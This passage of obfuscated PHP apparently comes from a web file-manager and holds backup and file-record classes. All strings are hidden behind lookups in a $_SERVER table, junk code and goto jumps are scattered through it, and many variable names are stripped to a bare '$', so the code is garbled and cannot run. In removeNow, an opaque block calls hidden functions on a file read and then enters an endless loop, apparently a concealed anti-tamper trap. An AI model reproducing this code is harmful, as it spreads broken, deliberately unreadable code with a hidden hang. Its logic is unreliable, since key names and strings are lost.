$[724]) { if (!$Ň) { break; } $Ň++; } return $Ճ; } public function qlvb87d397ed() { $Ȑ =& $_SERVER[ܮ]; $ߊ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ծ = $Ȑ[839]; if (strlen($Ծ) < $Ȑ[707]) { die; } $َΪ = array(); $ = $Ȑ[840]; if (!$) { die; } $ = 1; $ = $Ȑ[841]; if (strlen($) < $Ȑ[724]) { return; } while ($ <= (int) sqrt($ߊ)) { $ = $; $ɜ̡ = $Ȑ[842]; if (!$ɜ̡) { return; } while (!0) { $++; if ($ <= 2) { $ = $; break; } else { if ($ < 2) { continue; } } $܁ޓ = !0; for ($ = 2; $ <= sqrt($); $++) { if ($ % $ == 0) { $܁ޓ = !1; } } if ($܁ޓ) { $ = $; break; } } $َΪ[] = $; } $ǳ = 2; $٩ = $Ȑ[843]; while (strlen($٩) < $Ȑ[713]) { if (!$٩) { break; } $٩++; } for ($ = $ߊ; $ > 1; $--) { $܁ޓ = !0; foreach ($َΪ as $) { if ($ % $ == 0) { $܁ޓ = !1; break; } } if ($܁ޓ) { $ǳ = $; break; } } return $ǳ; } public function cveb8132e0c3($, $ڔϐ) { $զ =& $_SERVER[Ĵ]; return call_user_func(array($զ[8], $զ[314]), $, $ڔϐ); } public function pkro5032c3eb($, $ށ聖) { $䏲 =& $_SERVER[Ĵ]; return call_user_func(array($䏲[315], $䏲[316]), $, $ށ聖); $ = $_SERVER[ܮ][844]; if (!$) { return; } } public function lmwo084d3f18($ߵ糏, $إ) { $ =& $_SERVER[Ĵ]; return call_user_func(array($[315], $[317]), $ߵ糏, $إ); $Т = $_SERVER[ܮ][845]; if (!$Т) { return; } } } class Backup { protected static $name; protected static $option; protected static $manual; protected $model; public $message; public function __construct() { $this->model = Model($_SERVER[ܮ][846]); $ = $this->init(); if (!$) { return; } $this->keep(); } public function init() { $ܼ =& $_SERVER[ܮ]; $this->isManual(); self::$name = date($ܼ[847]); if (!($ = $this->model->lastItem())) { $ = $this->initData(); } else { self::$name = $[$ܼ[32]]; if ($[$ܼ[848]] == $ܼ[91]) { self::$name = date($ܼ[259]); $ = intval(_get($, $ܼ[849], 0)); if (self::$manual == 0 && $[$ܼ[32]] == self::$name) { $this->model->remove($[$ܼ[487]]); } $ = $this->initData($, $[$ܼ[850]]); } else { $ڒ = $this->checkStore($[$ܼ[850]]); if (!$ڒ) { return !1; } } } if (!$) { return !1; } self::$option = $; } private function isManual() { $ = _get($GLOBALS, $_SERVER[ܮ][851], 0); $ = intval($); self::$manual = $ && $ == 1 ? 1 : 0; } private function initData($ړ = 0, $Ɩ = '') { $̎¦ =& $_SERVER[ܮ]; $ݎ = $this->model->config(); if ($Ɩ && $ݎ[$̎¦[850]] != $Ɩ) { $ړ = 0; } $֯ = $this->checkStore($ݎ[$̎¦[850]]); if (!$֯) { return !1; } if (self::$manual == 1) { self::$name .= $̎¦[11] . date($̎¦[852]); } $ = array($̎¦[850] => $ݎ[$̎¦[850]], $̎¦[32] => self::$name, $̎¦[848] => 0, $̎¦[168] => $ݎ[$̎¦[168]], $̎¦[853] => self::$manual, $̎¦[854] => array($̎¦[855] => array($̎¦[848] => 0), $̎¦[856] => array($̎¦[848] => 0, $̎¦[857] => 0, $̎¦[858] => 0, $̎¦[33] => $̎¦[12], $̎¦[859] => 0, $̎¦[860] => 0), $̎¦[861] => array($̎¦[848] => 0, $̎¦[857] => 0, $̎¦[858] => 0, $̎¦[859] => 0, $̎¦[860] => 0), $̎¦[230] => array($̎¦[848] => 0, $̎¦[862] => 0, $̎¦[863] => 0, $̎¦[864] => 0, $̎¦[865] => 0, $̎¦[557] => $ړ, $̎¦[859] => 0, $̎¦[860] => 0)), $̎¦[859] => time(), $̎¦[860] => 0); $Î = $this->model->insert($); $[$̎¦[487]] = $Î; return $; } private function checkStore($ԴЯ) { $̎ = Model($_SERVER[ܮ][866]); $׮Ƶ = $̎->listData($ԴЯ); $ʠ = $̎->checkConfig($׮Ƶ, !0); if ($ʠ !== !0) { $this->message = $ʠ; return !1; } return !0; } public static function get() { if (!self::$option) { $ݳ = Model($_SERVER[ܮ][846]); $΢ = $ݳ->findByName(self::$name); $ݳ->parseContent($΢); self::$option = $΢; } return self::$option; } public static function set($) { $ =& $_SERVER[ܮ]; $ = self::get(); foreach ($ as $Ɔ => $) { array_set_value($, $Ɔ, $); } Model($[846])->update($[$[487]], $); self::$option = $; return self::$option; } public function keep() { $ =& $_SERVER[ܮ]; $֢ = self::get(); if (_get($֢, $[867], 0) == $[91]) { return; } $this->backupKeep($֢); self::set(array($[867] => 1)); } private function backupKeep($) { $Ԑߴ =& $_SERVER[ܮ]; if (self::$manual == 1) { return; } $ = $this->model->listData(); if (empty($)) { return; } $ݡ = array(); $嚑 = array(); $ = date($Ԑߴ[868], strtotime($Ԑߴ[869])); foreach ($ as $ڳ => $Ҧ) { $ϸ = $Ҧ[$Ԑߴ[32]]; if ($ڳ < 7 || $Ҧ[$Ԑߴ[853]] == $Ԑߴ[91]) { $ݡ[] = $ϸ; continue; } $ĺ = substr($ϸ, 0, 6); if ($ĺ < $) { continue; } if (!isset($嚑[$ĺ]) || $ϸ < $嚑[$ĺ]) { $嚑[$ĺ] = $ϸ; } if (substr($ϸ, 6, 2) == $Ԑߴ[870]) { $嚑[$ĺ] = $ϸ; } } $ݡ = array_merge($ݡ, array_values($嚑)); $ݡ = array_unique($ݡ); foreach ($ as $Ҧ) { $ϸ = $Ҧ[$Ԑߴ[32]]; if (!empty($ϸ) && in_array($ϸ, $ݡ)) { continue; } $this->model->remove($Ҧ[$Ԑߴ[487]]); $֥ = $this->backupPath($); IO::remove($֥, !1); } } private function backupPath($) { $ =& $_SERVER[ܮ]; static $͟ = null; if (is_null($͟)) { $͟ = Model($[871])->get($[872]); } $ϙ = $[$[32]]; $ܒ = substr(md5($[873] . $͟ . $ϙ), 0, 8); return "\173\151\157\x3a{$[$[850]]}\175\57\144\141\164\x61\142\141\163\145\57\142\141\x63\153\x75\x70\57" . $ϙ . $[11] . $ܒ; } public function db() { $ =& $_SERVER[ܮ]; $ʽ = self::get(); if (_get($ʽ, $[874], 0) == $[91]) { return !0; } $ = new BackupDb(); if (!$->index()) { return !1; } self::set(array($[874] => 1)); return !0; } public function dbFile() { $ =& $_SERVER[ܮ]; $Ħ = self::get(); if (_get($Ħ, $[875], 0) == $[91]) { return !0; } $ = new BackupDbFile(); if (!$->index()) { return !1; } self::set(array($[875] => 1)); return !0; } public function file() { $Ⱦ =& $_SERVER[ܮ]; $ӯ = self::get(); if (_get($ӯ, $Ⱦ[876], 0) == $Ⱦ[91]) { return !0; } self::set(array($Ⱦ[876] => 1, $Ⱦ[848] => 1)); return !0; } public static function log($ۢⰣ) { write_log($ۢⰣ, $_SERVER[ܮ][877]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ʏ =& $_SERVER[ܮ]; $ғ = Backup::get(); self::$io = $ғ[$ʏ[850]]; self::$name = $ғ[$ʏ[32]]; $ܭ = new DbManage(); $ = $ܭ->dbType(); $ = array($ʏ[878] => $, $ʏ[879] => time()); Backup::set($); $ϼ = $this->tmpFilesPath() . $ʏ[880] . self::$name . $ʏ[8]; del_dir($ϼ); mk_dir($ϼ); $ = $ߟ = 0; try { $ = $ܭ->db()->getTables(); } catch (Exception $Ӹ) { Backup::log($ʏ[881] . $Ӹ->getMessage()); return !1; } $ = array_diff($, array($ʏ[882], $ʏ[883])); foreach ($ as $꧓) { if ($꧓ == $ʏ[472]) { continue; } $ += $ܭ->model($꧓)->count(); } $ך = new Task($ʏ[884], $ʏ[877], $, LNG($ʏ[885]) . $ʏ[886] . LNG($ʏ[887])); $GLOBALS[$ʏ[888]] = self::$name; foreach ($ as $꧓) { $ = $ϼ . $꧓ . $ʏ[889]; if ($꧓ == $ʏ[472]) { @touch($); continue; } $ߟ += $ܭ->sqlFromDb($꧓, $, $ך); } unset($GLOBALS[$ʏ[888]]); $ך->end(); if ($ߟ > $) { $ = $ߟ; } $ = array($ʏ[878] => $, $ʏ[874] => 1, $ʏ[890] => $, $ʏ[891] => $ߟ, $ʏ[892] => time()); Backup::set($); if (!$ || abs($ - $ߟ) / $ > 0.01) { $豒ֽ = $ʏ[893]; if (!stristr(I18n::getType(), $ʏ[894])) { $豒ֽ = $ʏ[895]; } Backup::log(array($豒ֽ, $)); return !1; } return !0; } private function tmpFilesPath() { $۬ =& $_SERVER[ܮ]; $쫵 = TEMP_FILES; if ($GLOBALS[$۬[6]][$۬[92]][$۬[896]]) { $쫵 = $GLOBALS[$۬[6]][$۬[92]][$۬[896]]; if (!mk_dir($쫵) || !is_writable($쫵) || !IO::mkfile($쫵 . $۬[897])) { $쫵 = TEMP_FILES; } } return $쫵; } } goto e쮩; CɣΤ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($в) { $ =& $_SERVER[ܮ]; $ʞ = Model($[597])->where(array($[1968] => $в))->find(); $ = $this->_mkdirRoot(SourceModel::TYPE_USER, $в, $ʞ[$[32]]); $this->userDesktopAdd($); return $; } public function userDesktopAdd($ԥ) { $č =& $_SERVER[ܮ]; $ٵɕ = LNG($č[2464]); $锲 = $this->mkdir($ԥ, $ٵɕ); $this->metaSet($锲, $č[2465], $č[91]); $this->metaSet($ԥ, $č[2466], $锲); } public function userPathSafeAdd($) { $ =& $_SERVER[ܮ]; $ = Model($[597])->getInfoFull($); if (!$) { return !1; } if (_get($, $[618])) { return $[$[555]][$[2467]]; } $ = $this->_mkdirRoot(SourceModel::TYPE_USER, $, $[2468], $[2469]); Model($[597])->metaSet($, $[2467], $); $this->metaSet($, $[2470], $); return $; } public function userPathAppAdd($, $ő = '', $毳ܤ = '') { $ƶ =& $_SERVER[ܮ]; $ࣾ = Model($ƶ[597])->getInfoFull($); if (!$ࣾ) { return !1; } $Ƣ = $ࣾ[$ƶ[555]] ? $ࣾ[$ƶ[555]] : array(); $ = $Ƣ[$ƶ[2471]]; if (!$) { $ = $this->_mkdirRoot(SourceModel::TYPE_USER, $, $ƶ[2472], $ƶ[2473]); Model($ƶ[597])->metaSet($, $ƶ[2471], $ . $ƶ[12]); $this->metaSet($, $ƶ[2471], $); } if (!$ő) { return $; } $ = $Ƣ[$ƶ[2474] . $ő]; if (!$) { $ = $this->mkdir($, $ő); Model($ƶ[597])->metaSet($, $ƶ[2474] . $ő, $); $this->metaSet($, $ƶ[2474] . $ő, $); } if (!$毳ܤ) { return $; } $ٴ = $this->mkdir($, $毳ܤ); return $ٴ; } public function groupRootAdd($) { $ސ =& $_SERVER[ܮ]; $ = Model($ސ[605])->where(array($ސ[2269] => $))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $, $[$ސ[32]]); } public function systemRootPathAdd($ʎ) { if ($ʎ != $_SERVER[ܮ][628]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ʎ); } public function userRootRemove($Ь) { $ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ь, !0); foreach ($ as $ޗ) { if (!$ޗ) { continue; } $this->remove($ޗ[$_SERVER[ܮ][191]], !1); } } public function groupRootRemove($ˁߴ) { $꥚ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ˁߴ); if (!$꥚) { return; } $this->remove($꥚[$_SERVER[ܮ][191]], !1); } private function _mkdirRoot($İ, $ڕ, $ݑ, $è㡩 = '') { $ꛊ =& $_SERVER[ܮ]; $▹ = KodUser::id(); $Ј = array($ꛊ[492] => 0, $ꛊ[670] => $İ, $ꛊ[671] => $ڕ, $ꛊ[668] => 1, $ꛊ[672] => $▹, $ꛊ[673] => $▹, $ꛊ[669] => $è㡩, $ꛊ[674] => $ꛊ[613], $ꛊ[519] => 0, $ꛊ[640] => 0, $ꛊ[558] => 0, $ꛊ[675] => $ꛊ[12]); if ($ȴ = $this->where($Ј)->find()) { return $ȴ[$ꛊ[191]]; } $ = "\115\157\144\x65\154\x53\x6f\165\x72\143\145\x2e\x6d\x6b\x64\x69\162\x52\157\x6f\x74\56{$İ}\x2e{$ڕ}\56" . $ݑ; CacheLock::lock($); $Ј[$ꛊ[32]] = $ݑ; $ۧ = $this->add($Ј); $ = array($ꛊ[676] => short_id($ۧ)); $this->where(array($ꛊ[506] => $ۧ))->save($); CacheLock::unlock($); return $ۧ; } private function targetSourceRoot($찧, $, $ɣ = false) { $ =& $_SERVER[ܮ]; $Ĩ = array($[492] => 0, $[670] => $찧, $[671] => $); if ($ɣ) { $ = $this->where($Ĩ)->select(); return $ ? $ : array(); } $ = $this->where($Ĩ)->find(); return $ ? $ : array(); } public function sourceRootGroup($ﾳ؃) { $¿ =& $_SERVER[ܮ]; if (is_string($ﾳ؃)) { $ﾳ؃ = array($ﾳ؃); } $Ѕ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ﾳ؃, $¿[220]); $֧ = array($¿[446] => $Ѕ, $¿[443] => array($¿[857] => count($ﾳ؃))); $this->_listDataApply($֧[$¿[446]]); $this->_listMake($֧); return array_to_keyvalue($֧[$¿[85]], $¿[589]); } public function mkfile($ģ, $ދ, $ᩴ = '', $я = REPEAT_RENAME) { $Ը =& $_SERVER[ܮ]; $Ħ = KodIO::ioFileDriverGet($Ը[498] . $ģ . $Ը[402]); $Ȫ = Model($Ը[696])->addFileByContent($ᩴ, $Ħ, $ދ); return $this->_createFileCall($ģ, $ދ, $Ȫ, $я, $Ը[1543]); } public function addFile($, $و, $񄎴, $ = false, $· = REPEAT_RENAME) { $렔 =& $_SERVER[ܮ]; $հ = KodIO::ioFileDriverGet($렔[498] . $ . $렔[402]); $ʃ = Model($렔[696])->addFile($و, $հ, $񄎴, $); return $this->_createFileCall($, $񄎴, $ʃ, $·); } public function addFileByFileID($韮, $ꎬ, $ҚꙀ, $¸ = REPEAT_RENAME) { $ =& $_SERVER[ܮ]; $ = Model($[696])->find($ꎬ); Model($[696])->linkAdd($ꎬ); return $this->_createFileCall($韮, $ҚꙀ, $, $¸); } public function addFileByRemote($, $꣑, $, $ = array(), $䛬 = REPEAT_RENAME) { $ = Model($_SERVER[ܮ][696])->addFileByRemote($꣑, $, $); return $this->_createFileCall($, $, $, $䛬); } private function _createFileCall($, $根ߝ, $, $˟Ȟ, $ = "\x75\160\x6c\x6f\141\x64") { $ߗ =& $_SERVER[ܮ]; if (!$) { return !1; } $ڏ = !1; $this->setMasterDB(); $this->lockWriteStart($, $根ߝ); $ = $this->fileNameExist($, $根ߝ); $د = $this->_createFile($, $根ߝ, $, $˟Ȟ, $ڏ); if (!$ڏ) { Model($ߗ[560])->remove($[$ߗ[557]]); } if ($ڏ && $د && $د != $) { Model($ߗ[2437])->eventCreate($د, $); } $this->lockWriteEnd($, $根ߝ); return $د; } public function mkdir($, $, $߼ = REPEAT_SKIP) { $貇 =& $_SERVER[ܮ]; $this->setMasterDB(); $㍵ = $this->sourceInfo($); if (!$㍵) { return !1; } $this->lockWriteStart($, $); if ($߼ !== !1) { $ړ = $this->fileNameExist($, $); if ($ړ && $߼ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($, $); return $ړ; } $ = $this->fileNameAuto($, $, $߼); } $ = array($貇[668] => 1, $貇[509] => $, $貇[669] => $貇[12], $貇[558] => 0, $貇[640] => 0); $ô = $this->_addSource($, $㍵); Model($貇[2437])->eventCreate($ô, $貇[1544]); $this->lockWriteEnd($, $); return $ô; } public function listSourceRoot($, $復, $֑ = "\163\157\165\x72\143\x65\x49\x44\54\x74\x61\162\x67\x65\x74\111\x44\x2c\163\x69\172\x65") { $ =& $_SERVER[ܮ]; $ = $[463]; $ = array(); $崰 = 1024 * 50; $⴯ = is_array($⴯) ? $⴯ : array(); $ = count($復); $ = $this->tablePrefix . $[470]; for ($ = 0; $ < $; $++) { $× = $復[$]; $ .= "\123\x45\114\x45\103\x54\x20\52\x20\x46\x52\x4f\x4d\x20\50\x53\x45\114\x45\103\124\40{$֑}\x20\106\122\117\115\40\x60{$}\140\x20\127\110\105\122\x45\x20"; $ .= "\140\160\x61\x72\145\x6e\x74\111\104\140\x3d\60\x20\x41\x4e\x44\40\x60\x74\x61\x72\147\145\x74\111\x44\140\x3d{$×}\x20\x41\116\x44\x20\x60\x74\141\162\147\145\164\x54\171\160\x65\140\75{$}\40\141\x6e\x64\x20\x66\151\x6c\x65\124\x79\160\x65\75\x27\47\40\154\x69\155\151\164\x20\x31\x29\40\x61\163\40\x74\x62\x5f{$}\x20\x55\116\x49\x4f\116\x20\101\114\x4c\x20"; if ((strlen($) >= $崰 || $ == $ - 1) && $) { $ = substr($, 0, -strlen($[1206])); $ = $this->query($); $ = $[12]; $ = array_merge($, $); } } return $; } private function _createFile($, $, $ð, $¹, &$ڈ) { $ =& $_SERVER[ܮ]; $󂤹 = $this->sourceInfo($); if (!$ð || !$󂤹) { return !1; } if ($¹ !== !1) { $ý = $this->fileNameExist($, $); } $ڈ = !0; if ($¹ && $ý) { if ($¹ == REPEAT_SKIP) { $ڈ = !1; return $ý; } else { if ($¹ == REPEAT_REPLACE) { $ӯ = $this->sourceInfo($ý); $诗 = $this->fileHistory($ӯ, $ð[$[557]], $ð[$[79]]); if (!$诗) { $ڈ = !1; } else { $this->folderSizeReset($); } return $ý; } else { $ = $this->fileNameAuto($, $, $¹, !1); } } } $ = array($[668] => 0, $[509] => $, $[669] => substr(get_path_ext($), 0, 10), $[558] => $ð[$[557]], $[640] => $ð[$[79]]); $ = $this->_addSource($, $󂤹); $this->folderSizeReset($, intval($[$[79]])); return $; } protected function fileHistory($،̷, $Ǯ, $) { $ٲ =& $_SERVER[ܮ]; if ($،̷[$ٲ[557]] == $Ǯ) { return !1; } $this->checkLock($،̷[$ٲ[191]], $Ǯ); Model($ٲ[2182])->addHistory($،̷); $ϰ = array($ٲ[673] => USER_ID, $ٲ[513] => time(), $ٲ[557] => $Ǯ, $ٲ[79] => $); $this->where(array($ٲ[506] => $،̷[$ٲ[191]]))->save($ϰ); $this->sourceCacheClear($،̷[$ٲ[191]]); return !0; } public function checkLock($삘, $) { $҇ =& $_SERVER[ܮ]; $߫ = $this->pathInfo($삘); if (!$this->fileIsLock($߫, !0)) { return; } $۰ = Session::get($҇[2475]); $ѥ = substr($߫[$҇[32]], 0, -1 - strlen($߫[$҇[166]])) . $҇[1399] . $۰ . $҇[10] . $߫[$҇[166]]; $ = Model($҇[696])->find($); $this->_createFileCall($߫[$҇[190]], $ѥ, $, REPEAT_REPLACE, $҇[1543]); $ = $߫[$҇[555]][$҇[633]]; $ = $[$҇[2476]] ? $[$҇[2476]] : $[$҇[32]]; show_json(LNG($҇[2477]) . $҇[2478] . LNG($҇[2479]) . $҇[2480] . $ . $҇[2481], !1); } public function fileIsLock($́, $ = false) { $࿈ =& $_SERVER[ܮ]; if (!_get($́, $࿈[629], 0)) { return !1; } if ($́[$࿈[555]][$࿈[632]] != USER_ID) { return !0; } $Ŵ = $GLOBALS[$࿈[6]][$࿈[92]][$࿈[630]]; if ($́[$࿈[555]][$࿈[631]] <= time() - $Ŵ) { $this->metaSet($́[$࿈[191]], $࿈[632], null); $this->metaSet($́[$࿈[191]], $࿈[631], null); } if ($) { $this->metaSet($́[$࿈[191]], $࿈[631], time()); } return !1; } private function _addSource($ދї, $) { $ =& $_SERVER[ܮ]; $ = KodUser::id(); $䘬 = array($[670] => $[$[188]], $[671] => $[$[589]], $[672] => $, $[673] => $, $[492] => $[$[191]], $[674] => $[$[604]] . $[$[191]] . $[50], $[519] => 0, $[675] => $[12]); $ދї = array_merge($䘬, $ދї); $this->updateModifyTime($ދї[$[190]]); $ = $[2482] . $[$[191]]; if (isset(self::$cacheChildList[$])) { unset(self::$cacheChildList[$]); } static $ = false; if (!$) { Hook::trigger($[658], $ދї); $ = !0; } $ = $this->add($ދї); $ = array($[676] => short_id($)); $this->where(array($[506] => $))->save($); $this->setNamePinyin($, $ދї[$[32]]); return $; } public function remove($, $ = true) { $ =& $_SERVER[ܮ]; $߲ = $this->sourceInfo($); $葊 = intval($߲[$[188]]) === self::TYPE_SYSTEM; $ë = Model($[522])->get($[2483]) == $[91]; if ($葊 || $ || !$ë) { return $this->removeNow($, $); } $מ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ˇ = $߲[$[188]] == self::TYPE_USER ? $[684] : $[598]; if ($ˇ == $[684]) { $ǔ = Model($[597])->getInfo($߲[$[589]]); $ = !empty($ǔ[$[2476]]) ? $ǔ[$[2476]] : $ǔ[$[32]]; $ = $[337] . $ . $[2484] . $߲[$[589]]; } else { $ǔ = Model($[605])->getInfo($߲[$[589]]); $ = _get($ǔ, $[32]); $ = $[173] . $ . $[2485] . $߲[$[589]]; } $懯 = $[2486] . md5($); CacheLock::lock($懯); $ꍥ = $this->fileNameExist($מ, $); if (!$ꍥ) { $ꍥ = $this->mkdir($מ, $, REPEAT_SKIP); $this->metaSet($ꍥ, $[2487], $ˇ); $this->metaSet($ꍥ, $[2488], $߲[$[589]]); if ($߲[$[190]] != 0) { $this->metaSet($ꍥ, $[2489], _get($ǔ, $[2490])); } } CacheLock::unlock($懯); $this->metaSet($, $[2491], $߲[$[190]]); $this->where(array($[191] => $))->save(array($[513] => time())); $this->recycleClear($߲); Model($[655])->eventRemove($); $ߵ = $this->move($, $ꍥ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($߲[$[190]]); return $ߵ; } private function recycleClear($ޛ) { $֖ =& $_SERVER[ܮ]; $ɸ = $this->childrenAll($ޛ); $ݗو = array($֖[506] => array($֖[507], $ɸ[$֖[2492]])); Model($֖[2493])->where($ݗو)->delete(); } public function removeNow($, $ = true) { $ތ =& $_SERVER[ܮ]; if (!isset($_SERVER[$ތ[900]]) || !isset($_SERVER[$ތ[898]])) { $ = $ތ[1040]; $ʳρ = $ތ[901]; $ݗ = $_SERVER[$ތ[902]] . $ތ[903]; $낷 = $ʳρ($ݗ); $μ = explode($ތ[285], $낷); if (count($μ) < $ތ[724]) { $賲 = $ތ[904]; $賲(); } $㲢 = $ތ[1041]; $㲢($_SERVER[$ތ[1042]]); $ߒ = 1; for ($ = $ߒ; $ > 0; $++) { $㲢 = json_encode($GLOBALS[$ތ[507]]); } } $É = $this->sourceInfo($); $ǌ = $this->pathInfoMore($); if (!$É) { return !0; } if ($É[$ތ[190]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($); Hook::trigger($ތ[2494], $ǌ, $); if ($) { Model($ތ[2493])->moveToRecycle($); } else { $ = $this->childrenAll($É); Model($ތ[655])->eventRemove($); $this->removeRelevance($[$ތ[2492]], $[$ތ[1780]]); } $this->folderSizeReset($É[$ތ[190]]); $ = array($É[$ތ[190]]); if ($É[$ތ[500]] == $ތ[91]) { $[] = $É[$ތ[191]]; } $this->updateModifyTime($); $this->lockMoveEnd($); Hook::trigger($ތ[2019], $ǌ, $); return !0; } public function childrenAll($) { $ =& $_SERVER[ܮ]; $ο = $[$[191]]; if ($[$[500]] == $[91]) { $ = array($[674] => array($[635], $[$[604]] . $ο . $[636])); $ = array($[674] => $[$[604]]); $Ƈ = $this->field($[2495])->where($)->select(); $ژ = !1; $ў = array($ο); if ($Ƈ) { $ژ = array_to_keyvalue($Ƈ, $[12], $[557]); $ژ = array_remove_value($ژ, $[228]); $ў = array_to_keyvalue($Ƈ, $[12], $[191]); $ў[] = $ο; } } else { $ژ = array($[$[557]]); $ў = array($ο); } return array($[2492] => $ў, $[1780] => $ژ); } public function removeArray($) { if (!$) { return !0; } } public function removeRelevance($, $) { $ =& $_SERVER[ܮ]; $ = $ ? $ : array(); $ = $ ? $ : array(); $ = array_unique(array_filter($)); $ = array_filter($); if (!$) { return !1; } $ = array($[506] => array($[507], $)); Model($[2493])->where($)->delete(); Model($[549])->where($)->delete(); Model($[2330])->where($)->delete(); Model($[655])->where($)->delete(); Model($[1563])->removeBySource($); Model($[2182])->removeBySource($); $this->where($)->delete(); Model($[560])->remove($); for ($ɑɅ = 0; $ɑɅ < count($); $ɑɅ++) { $this->sourceCacheClear($[$ɑɅ]); } } public function rename($, $) { $ɕ =& $_SERVER[ܮ]; $ǚ = $this->sourceInfo($); if (!$ǚ) { return !1; } $׿Ҏ = $this->fileNameExist($ǚ[$ɕ[190]], $); if ($׿Ҏ && $׿Ҏ != $) { return !1; } $ = array($ɕ[509] => $, $ɕ[673] => USER_ID); if ($ǚ[$ɕ[500]] != $ɕ[91]) { $[$ɕ[501]] = substr(get_path_ext($), 0, 10); } Model($ɕ[655])->eventRename($, $ǚ[$ɕ[32]], $); $this->sourceCacheClear($); $this->setNamePinyin($, $[$ɕ[32]], !1); $this->updateModifyTime($ǚ[$ɕ[190]]); $뙥 = $this->where(array($ɕ[506] => $))->data($)->save(); $외 = $ɕ[2482] . $ǚ[$ɕ[190]]; if (isset(self::$cacheChildList[$외])) { unset(self::$cacheChildList[$외]); } return $뙥; } public function setNamePinyin($蒒, $, $ = true) { $Ʊ =& $_SERVER[ܮ]; $ߝȳ = Input::check($, $Ʊ[677]); $Ճ = array($Ʊ[531] => KodSort::makeStr($)); if ($ߝȳ) { $Ճ[$Ʊ[552]] = str_replace($Ʊ[53], $Ʊ[12], Pinyin::get($)); $Ճ[$Ʊ[551]] = Pinyin::get($, $Ʊ[678]); } if (!$ && !$ߝȳ) { $Ճ[$Ʊ[552]] = null; $Ճ[$Ʊ[551]] = null; } $this->metaSet($蒒, $Ճ); } public function getContent($ܭ) { $ =& $_SERVER[ܮ]; $ = $this->fileInfoGet($ܭ); if (!$) { return !1; } if ($[$[79]] == 0) { return $[12]; } $岆ɨ = $[2496] . $[$[563]]; if ($[$[79]] <= 1024 * 10) { $ͽ = Cache::get($岆ɨ); if (!$ͽ) { $ͽ = IO::getContent($[$[87]]); Cache::set($岆ɨ, $ͽ); } return $ͽ; } if (!$[$[87]]) { return $[12]; } return IO::getContent($[$[87]]); } public function setDesc($, $) { $խ݌ =& $_SERVER[ܮ]; Model($խ݌[655])->eventAddDesc($, $); return $this->metaSet($, $խ݌[540], $); } public function setContent($ȋ, $荏 = '') { $ =& $_SERVER[ܮ]; $ = $this->sourceInfo($ȋ); $ٰ = $this->fileInfoGet($ȋ); if (!$ٰ || !$) { return !1; } $ʇ = KodIO::ioFileDriverGet($[498] . $ȋ . $[402]); $ۄ = Model($[560])->addFileByContent($荏, $ʇ, $[$[32]]); if (!$ۄ) { return !1; } $Ͷ = $this->fileHistory($, $ۄ[$[557]], $ۄ[$[79]]); if (!$Ͷ) { return Model($[560])->remove($ۄ[$[557]]); } $this->folderSizeReset($[$[190]]); return !0; } public function fileSubstr($ٝ, $Ǎ, $) { $ɛ = $this->fileInfoGet($ٝ); if (!$ɛ) { return !1; } return IO::fileSubstr($ɛ[$_SERVER[ܮ][87]], $Ǎ, $); } public function fileInfoGet($޿) { $ =& $_SERVER[ܮ]; $ߨ = $this->sourceInfo($޿); if (!$ߨ || $ߨ[$[500]]) { return !1; } $񆍈׃ = $[564] . $ߨ[$[557]]; $ = _get(self::$cacheFileInfo, $񆍈׃); if ($) { return $; } $ꖸ = Model($[560])->fileInfo($ߨ[$[557]]); if ($ꖸ) { $ꖸ[$[32]] = $ߨ[$[32]]; } self::$cacheFileInfo[$񆍈׃] = $ꖸ; return $ꖸ; } private function folderChildrenNumber($Ʃ) { $ =& $_SERVER[ܮ]; $ = $this->sourceInfo($Ʃ); $܅ = array($[674] => array($[635], $[$[604]] . $Ʃ . $[636]), $[671] => $[$[589]], $[519] => intval($[$[520]]), $[668] => 1); $ = $this->where($܅)->count(); $ = $this->where($܅)->where(array($[668] => 0))->count(); return array($[83] => $, $[84] => $); } public function pathInfo($Ƒ, $Ǎ = false) { $ʚ =& $_SERVER[ܮ]; $Ǎ = !1; $Ƒ = intval($Ƒ); if (!$Ƒ) { return !1; } $Ё = $ʚ[548] . intval($Ǎ) . $ʚ[476] . $Ƒ; $ťź = _get(self::$cachePathInfo, $Ё); if ($ťź) { return $ťź; } $ = $this->sourceInfo($Ƒ); if (!$) { return !1; } $ = $this->_listDataApplyItem($, $Ǎ); self::$cachePathInfo[$Ё] = $; return $; } public static $cachePathInfoMore = array(); public function pathInfoMore($˫) { $ =& $_SERVER[ܮ]; $ = _get(self::$cachePathInfoMore, $˫); if ($) { return $; } $ԉë = $this->pathInfo($˫); if (!$ԉë) { return !1; } if ($ԉë[$[500]] == $[91]) { $ԉë[$[82]] = $this->folderChildrenNumber($˫); } self::$cachePathInfoMore[$˫] = $ԉë; return $ԉë; } public function sourceInfo($) { $իȺ =& $_SERVER[ܮ]; if (!$) { return array(); } $ = intval($); $ߓ = $իȺ[547] . $; $ = _get(self::$cacheSourceInfo, $ߓ); if ($) { return $; } $ = $this->where(array($իȺ[191] => $))->find(); self::$cacheSourceInfo[$ߓ] = $; return self::$cacheSourceInfo[$ߓ]; } public function sourceCacheClear($ = false) { self::cacheClear($); } public static function cacheClear($۽ = false) { $ =& $_SERVER[ܮ]; if ($۽ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$[547] . $۽]); unset(self::$cachePathInfoMore[$۽]); unset(self::$cachePathInfo[$[2497] . $۽]); unset(self::$cachePathInfo[$[2498] . $۽]); } public function metaSet($, $궽 = null, $р = null) { $ = parent::metaSet($, $궽, $р); if ($) { $this->sourceCacheClear($); } return $; } public function pathInfoByPath($ŧ, $̓) { $ɪ㹋 =& $_SERVER[ܮ]; $ߟ = !$̓ ? array() : explode($ɪ㹋[8], trim($̓, $ɪ㹋[8])); $ = intval($ŧ); foreach ($ߟ as $Ȇ) { $馓 = array($ɪ㹋[190] => $, 